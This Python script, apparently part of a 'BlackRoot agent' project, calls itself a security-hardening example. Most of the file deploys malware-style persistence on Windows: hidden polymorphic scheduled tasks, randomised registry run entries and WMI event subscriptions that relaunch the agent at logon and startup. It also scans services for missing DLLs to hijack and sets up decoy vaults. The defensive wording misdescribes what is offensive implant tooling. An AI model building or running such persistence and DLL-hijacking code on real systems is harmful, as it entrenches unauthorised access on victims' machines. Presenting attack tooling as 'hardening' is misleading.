
"""
Practical Integration Example: Applying Security Hardening to BlackRoot Agent

This example demonstrates how to integrate all Priority 1 & Priority 2 security
hardening features into the BlackRoot agent platform.
"""

import os
import sys
import logging
from typing import Optional
import json
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler(os.path.expanduser("~/.blackroot_hardening.log")),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('BlackRootHardeningExample')


class HardenedBlackRootAgent:
    """
    Example implementation of BlackRoot agent with full security hardening.
    
    This demonstrates how to integrate:
    1. Vault randomization
    2. Registry randomization
    3. Polymorphic task scheduling
    4. WMI event subscriptions
    5. Service DLL hijacking
    """
    
    def __init__(self, deployment_id: Optional[str] = None, deployment_seed: Optional[str] = None):
        """
        Initialize hardened agent with security hardening configuration.
        
        Args:
            deployment_id: Unique identifier for this deployment
            deployment_seed: Seed for reproducible hardening
        """
        self.deployment_id = deployment_id or f"deployment_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.deployment_seed = deployment_seed or self.deployment_id
        
        self.agent_path = os.path.abspath(__file__)
        self.agent_dir = os.path.dirname(self.agent_path)
        
        # Hardening artifacts
        self.vault_path = None
        self.registry_entries = []
        self.scheduled_tasks = []
        self.wmi_subscriptions = []
        self.service_hijacks = []
        
        logger.info(f"Initialized HardenedBlackRootAgent")
        logger.info(f"  Deployment ID: {self.deployment_id}")
        logger.info(f"  Deployment Seed: {self.deployment_seed}")
        logger.info(f"  Agent Path: {self.agent_path}")
    
    def stage_1_initialize_vault(self) -> bool:
        """
        Stage 1: Initialize randomized vault with honeypots.
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("\n" + "="*60)
        logger.info("STAGE 1: Initializing Randomized Vault")
        logger.info("="*60)
        
        try:
            from vault_randomization import VaultRandomizationEngine, DecoyVaultHoneypot
            
            # Generate randomized vault path
            self.vault_path = VaultRandomizationEngine.get_randomized_vault_path(
                seed=self.deployment_seed
            )
            logger.info(f"✓ Generated randomized vault path: {self.vault_path}")
            
            # Create vault directory
            os.makedirs(self.vault_path, mode=0o700, exist_ok=True)
            logger.info(f"✓ Created vault directory with restricted permissions")
            
            # Store recovery information
            recovery_info = VaultRandomizationEngine.store_vault_recovery_info(self.vault_path)
            logger.info(f"✓ Stored vault recovery info: {recovery_info['vault_id']}")
            
            # Create decoy vaults
            decoy_count = DecoyVaultHoneypot.create_all_decoy_vaults()
            logger.info(f"✓ Created {decoy_count} honeypot vault instances")
            
            return True
            
        except Exception as e:
            logger.error(f"✗ Vault initialization failed: {e}")
            return False
    
    def stage_2_deploy_persistence(self) -> bool:
        """
        Stage 2: Deploy multi-layer persistence mechanisms.
        
        Returns:
            True if at least one persistence method deployed
        """
        logger.info("\n" + "="*60)
        logger.info("STAGE 2: Deploying Multi-Layer Persistence")
        logger.info("="*60)
        
        persistence_success = False
        
        # Get agent executable path
        agent_executable = self.agent_path
        
        try:
            from persistence_hardening import (
                RegistryRandomizer, PolymorphicTaskScheduler,
                WMIEventSubscription
            )
            
            # Priority 1: Registry Randomization
            logger.info("\n--- Priority 1: Registry Randomization ---")
            try:
                for i in range(3):
                    reg_entry = RegistryRandomizer.create_randomized_registry_entry(
                        target_path=agent_executable,
                        seed=f"{self.deployment_seed}_{i}"
                    )
                    self.registry_entries.append(reg_entry)
                    logger.info(f"  Entry {i+1}: {reg_entry['registry_path']}\\{reg_entry['value_name']}")
                
                # Deploy actual registry entry (requires admin)
                if sys.platform == "win32":
                    success = RegistryRandomizer.register_in_randomized_location(
                        agent_executable,
                        seed=self.deployment_seed
                    )
                    if success:
                        logger.info("✓ Registry persistence deployed")
                        persistence_success = True
                    else:
                        logger.warning("⚠ Registry persistence requires admin privileges")
                else:
                    logger.info("ℹ Registry persistence only works on Windows")
                    
            except Exception as e:
                logger.error(f"✗ Registry deployment failed: {e}")
            
            # Priority 2: Polymorphic Scheduled Tasks
            logger.info("\n--- Priority 2: Polymorphic Task Scheduling ---")
            try:
                trigger_types = ["AtLogon", "AtStartup", "AtScheduledTime"]
                for trigger in trigger_types:
                    task_config = PolymorphicTaskScheduler.create_polymorphic_task(
                        executable=agent_executable,
                        trigger_type=trigger,
                        hidden=True
                    )
                    self.scheduled_tasks.append(task_config)
                    logger.info(f"  Task: {task_config['task_name']} ({trigger})")
                
                if sys.platform == "win32":
                    success = PolymorphicTaskScheduler.register_polymorphic_task(
                        agent_executable,
                        trigger_type="AtLogon"
                    )
                    if success:
                        logger.info("✓ Polymorphic task persistence deployed")
                        persistence_success = True
                    else:
                        logger.warning("⚠ Task scheduling requires admin privileges")
                else:
                    logger.info("ℹ Task scheduling only works on Windows")
                    
            except Exception as e:
                logger.error(f"✗ Task deployment failed: {e}")
            
            # Priority 2: WMI Event Subscriptions
            logger.info("\n--- Priority 2: WMI Event Subscriptions ---")
            try:
                event_filters = ["startup", "logon"]
                for event_filter in event_filters:
                    subscription = WMIEventSubscription.create_wmi_event_subscription(
                        executable=agent_executable,
                        event_filter=event_filter
                    )
                    self.wmi_subscriptions.append(subscription)
                    logger.info(f"  Subscription: {subscription['consumer_name']} ({event_filter})")
                
                if sys.platform == "win32":
                    success = WMIEventSubscription.register_wmi_subscription(
                        agent_executable,
                        event_filter="startup"
                    )
                    if success:
                        logger.info("✓ WMI event subscription deployed")
                        persistence_success = True
                    else:
                        logger.warning("⚠ WMI subscription requires admin privileges")
                else:
                    logger.info("ℹ WMI events only available on Windows")
                    
            except Exception as e:
                logger.error(f"✗ WMI subscription failed: {e}")
        
        except Exception as e:
            logger.error(f"✗ Persistence deployment failed: {e}")
        
        return persistence_success
    
    def stage_3_service_hardening(self) -> bool:
        """
        Stage 3: Scan and deploy service DLL hijacking opportunities.
        
        Returns:
            True if vulnerabilities found (deployment readiness)
        """
        logger.info("\n" + "="*60)
        logger.info("STAGE 3: Service DLL Hijacking Analysis")
        logger.info("="*60)
        
        try:
            from service_hijacking import ServiceDLLScanner
            
            if sys.platform != "win32":
                logger.info("ℹ Service hijacking only available on Windows")
                return False
            
            # Scan for vulnerable services
            vulnerable_services = ServiceDLLScanner.scan_all_services_for_hijacking()
            logger.info(f"✓ Found {len(vulnerable_services)} vulnerable services:")
            
            for i, service_info in enumerate(vulnerable_services[:5]):  # Show first 5
                logger.info(f"\n  Service {i+1}: {service_info['service_name']}")
                logger.info(f"    Executable: {service_info['executable']}")
                logger.info(f"    Missing DLLs: {[dll[0] for dll in service_info['missing_dlls']]}")
                self.service_hijacks.append(service_info)
            
            return len(vulnerable_services) > 0
            
        except Exception as e:
            logger.error(f"✗ Service scanning failed: {e}")
            return False
    
    def stage_4_generate_report(self) -> str:
        """
        Stage 4: Generate comprehensive hardening report.
        
        Returns:
            Path to saved report
        """
        logger.info("\n" + "="*60)
        logger.info("STAGE 4: Generating Hardening Report")
        logger.info("="*60)
        
        try:
            report = {
                "deployment_id": self.deployment_id,
                "deployment_seed": self.deployment_seed,
                "timestamp": datetime.now().isoformat(),
                "agent_path": self.agent_path,
                "platform": sys.platform,
                "hardening_status": {
                    "vault_randomization": {
                        "status": "deployed" if self.vault_path else "pending",
                        "vault_path": self.vault_path,
                    },
                    "registry_randomization": {
                        "status": "deployed" if self.registry_entries else "pending",
                        "entries": len(self.registry_entries),
                        "locations": [e["registry_path"] for e in self.registry_entries]
                    },
                    "polymorphic_tasks": {
                        "status": "deployed" if self.scheduled_tasks else "pending",
                        "tasks": len(self.scheduled_tasks),
                        "names": [t["task_name"] for t in self.scheduled_tasks]
                    },
                    "wmi_subscriptions": {
                        "status": "deployed" if self.wmi_subscriptions else "pending",
                        "subscriptions": len(self.wmi_subscriptions),
                        "consumers": [s["consumer_name"] for s in self.wmi_subscriptions]
                    },
                    "service_hijacking": {
                        "status": "analyzed" if self.service_hijacks else "no_opportunities",
                        "vulnerable_services": len(self.service_hijacks),
                        "details": self.service_hijacks[:3]  # First 3 for report
                    }
                }
            }
            
            # Save report to file
            report_path = os.path.expanduser(f"~/.blackroot_{self.deployment_id}_hardening_report.json")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
            
            with open(report_path, 'w') as f:
                json.dump(report, f, indent=2)
            
            os.chmod(report_path, 0o600)  # Restrict to owner
            logger.info(f"✓ Hardening report saved to: {report_path}")
            
            return report_path
            
        except Exception as e:
            logger.error(f"✗ Report generation failed: {e}")
            return ""
    
    def full_hardening_deployment(self) -> bool:
        """
        Execute full hardening deployment pipeline.
        
        Returns:
            True if deployment successful
        """
        logger.info("\n" + "#"*60)
        logger.info("# BLACKROOT AGENT SECURITY HARDENING DEPLOYMENT")
        logger.info("#"*60)
        
        # Stage 1: Vault
        stage1_ok = self.stage_1_initialize_vault()
        
        # Stage 2: Persistence
        stage2_ok = self.stage_2_deploy_persistence()
        
        # Stage 3: Services
        stage3_ok = self.stage_3_service_hardening()
        
        # Stage 4: Report
        self.stage_4_generate_report()
        
        logger.info("\n" + "#"*60)
        logger.info("# DEPLOYMENT SUMMARY")
        logger.info("#"*60)
        logger.info(f"Vault Randomization:     {'✓ SUCCESS' if stage1_ok else '✗ FAILED'}")
        logger.info(f"Persistence Deployment:  {'✓ SUCCESS' if stage2_ok else '✗ FAILED'}")
        logger.info(f"Service Analysis:        {'✓ COMPLETED' if stage3_ok else '✗ NO OPPORTUNITIES'}")
        logger.info(f"Overall Status:          {'✓ HARDENING COMPLETE' if stage1_ok and stage2_ok else '⚠ PARTIAL DEPLOYMENT'}")
        logger.info("#"*60 + "\n")
        
        return stage1_ok and stage2_ok


# Alternative: Using integration module
class QuickHardenedAgent:
    """
    Simplified example using security_hardening_integration module.
    """
    
    def __init__(self, agent_executable: str):
        self.agent_executable = agent_executable
        logger.info(f"Initialized QuickHardenedAgent for: {agent_executable}")
    
    def deploy_priority_1(self):
        """Deploy Priority 1 features only."""
        from security_hardening_integration import apply_priority_1_hardening
        
        logger.info("Deploying Priority 1 hardening...")
        results = apply_priority_1_hardening(
            agent_executable=self.agent_executable,
            seed="quick_deployment"
        )
        
        logger.info(f"Priority 1 Results: {json.dumps(results, indent=2)}")
        return results
    
    def deploy_priority_2(self):
        """Deploy Priority 2 features only."""
        from security_hardening_integration import apply_priority_2_hardening
        
        logger.info("Deploying Priority 2 hardening...")
        results = apply_priority_2_hardening(
            agent_executable=self.agent_executable,
            seed="quick_deployment"
        )
        
        logger.info(f"Priority 2 Results: {json.dumps(results, indent=2)}")
        return results
    
    def deploy_all(self):
        """Deploy all hardening features."""
        from security_hardening_integration import apply_full_hardening
        
        logger.info("Deploying full hardening pipeline...")
        results = apply_full_hardening(
            agent_executable=self.agent_executable,
            seed="quick_deployment",
            deployment_id="quick_hardened_001"
        )
        
        logger.info(f"Full Hardening Results: {json.dumps(results, indent=2)}")
        return results


# Main execution
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="BlackRoot Agent Security Hardening")
    parser.add_argument("--mode", choices=["full", "quick", "priority1", "priority2"], 
                       default="full",
                       help="Hardening deployment mode")
    parser.add_argument("--deployment-id", default=None,
                       help="Optional deployment identifier")
    parser.add_argument("--seed", default=None,
                       help="Optional seed for reproducible hardening")
    
    args = parser.parse_args()
    
    if args.mode == "full":
        # Full hardened agent deployment
        agent = HardenedBlackRootAgent(
            deployment_id=args.deployment_id,
            deployment_seed=args.seed
        )
        success = agent.full_hardening_deployment()
        sys.exit(0 if success else 1)
    
    elif args.mode == "quick":
        # Quick deployment using integration module
        agent = QuickHardenedAgent(agent_executable=os.path.abspath(__file__))
        agent.deploy_all()
        sys.exit(0)
    
    elif args.mode == "priority1":
        # Priority 1 only
        agent = QuickHardenedAgent(agent_executable=os.path.abspath(__file__))
        agent.deploy_priority_1()
        sys.exit(0)
    
    elif args.mode == "priority2":
        # Priority 2 only
        agent = QuickHardenedAgent(agent_executable=os.path.abspath(__file__))
        agent.deploy_priority_2()
        sys.exit(0)
